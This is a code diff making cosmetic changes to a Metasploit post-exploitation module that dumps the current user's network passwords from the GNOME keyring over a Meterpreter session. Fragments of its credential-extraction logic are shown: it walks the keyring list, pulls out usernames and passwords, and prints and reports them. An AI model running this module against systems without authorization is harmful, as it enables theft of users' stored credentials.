@@ -13,6 +13,7 @@ class MetasploitModule < Msf::Post
       'Name'           => 'Gnome-Keyring Dump',
       'Description'    => %q{
         Use libgnome-keyring to extract network passwords for the current user.
+        This module does not require root privileges to run.
       },
       'Author'        => 'Spencer McIntyre',
       'License'       => MSF_LICENSE,
@@ -36,7 +37,7 @@ class MetasploitModule < Msf::Post
   end
 
   # https://developer.gnome.org/glib/unstable/glib-Doubly-Linked-Lists.html#GList
-  def struct_GList
+  def struct_glist
     session.native_arch == ARCH_X64 ? GList_x64 : GList_x86
   end
 
@@ -69,7 +70,7 @@ class MetasploitModule < Msf::Post
   end
 
   # https://developer.gnome.org/gnome-keyring/stable/gnome-keyring-Network-Passwords.html#GnomeKeyringNetworkPasswordData
-  def struct_GnomeKeyringNetworkPasswordData
+  def struct_gnomekeyringnetworkpassworddata
     session.native_arch == ARCH_X64 ? GnomeKeyringNetworkPasswordData_x64 : GnomeKeyringNetworkPasswordData_x86
   end
 
@@ -133,8 +134,8 @@ class MetasploitModule < Msf::Post
   end
 
   def get_list_entry(address)
-    glist_struct = get_struct(address, struct_GList)
-    glist_struct[:data] = get_struct(glist_struct[:data_ptr], struct_GnomeKeyringNetworkPasswordData)
+    glist_struct = get_struct(address, struct_glist)
+    glist_struct[:data] = get_struct(glist_struct[:data_ptr], struct_gnomekeyringnetworkpassworddata)
     glist_struct
   end
 
@@ -167,7 +168,7 @@ class MetasploitModule < Msf::Post
   def resolve_host(name)
     address = @hostname_cache[name]
     return address unless address.nil?
-    vprint_status("Resolving hostname #{name}")
+    vprint_status("Resolving hostname: #{name}")
     begin
       address = session.net.resolve.resolve_host(name)[:ip]
     rescue Rex::Post::Meterpreter::RequestError
@@ -214,7 +215,7 @@ class MetasploitModule < Msf::Post
     begin
       entry = get_list_entry(entry[:next_ptr])
       pw_data = entry[:data]
-      # resolve necessary string files to non-empty strings or nil
+      # resolve necessary string fields to non-empty strings or nil
       [:server, :user, :domain, :password, :protocol].each do |field|
         value = pw_data[field]
         pw_data[field] = nil
@@ -238,7 +239,7 @@ class MetasploitModule < Msf::Post
       print_good(printable)
 
       pw_data[:port] = resolve_port(pw_data[:protocol]) if pw_data[:port] == 0 and !pw_data[:protocol].nil?
-      next if pw_data[:port] == 0  # can't report with a valid port
+      next if pw_data[:port] == 0  # can't report without a valid port
       ip_address = resolve_host(pw_data[:server])
       next if ip_address.nil?      # can't report without an ip address
 
@@ -252,6 +253,7 @@ class MetasploitModule < Msf::Post
       )
 
     end while entry[:next_ptr] != list_anchor and entry[:next_ptr] != 0
+
     libgnome_keyring.gnome_keyring_network_password_list_free(list_anchor)
   end
 end
